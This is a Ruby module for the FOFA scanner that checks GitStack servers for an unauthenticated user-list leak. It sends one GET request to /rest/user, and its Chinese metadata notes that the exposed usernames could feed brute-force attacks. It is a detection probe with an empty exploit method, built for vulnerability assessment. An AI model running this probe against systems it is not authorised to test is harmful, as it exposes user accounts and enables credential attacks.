if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "Gitstack平台user文件信息泄露",
      "Description": "GitStack是一款win平台下的Git可视化平台。使用GET方式可以直接查看GitStack仓库的用户列表，存在未授权访问信息泄露漏洞，攻击者可利用获取到的用户名列表进行爆破，进而利用其他漏洞创建用户，执行命令等恶意操作。",
      "Product": "gitstack",
      "Homepage": "https://gitstack.com",
      "DisclosureDate": "2018-01-15",
      "Author": "blue-bird",
      "FofaQuery": "body=\"^gitstack/\"",
      "Level": "1",
      "Impact": "<p>攻击者可利用获取到的用户名列表进行爆破，进而利用其他漏洞创建用户，执行命令等恶意操作。<br></p>",
      "Recommandation": "<p style=\"text-align: start;\">1、限定目录。</p><p style=\"text-align: start;\">2、白名单限定可读取路径。</p><p>3、对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p>",
      "References": [
            "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/http/gitstack_rest.rb"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/rest/user",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "everyone",
                                    "bz": "gitstack必然存在的用户"
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "Posttime": "2018-10-22 18:32:52",
      "fofacli_version": "3.0.9",
      "fofascan_version": "0.1.16",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end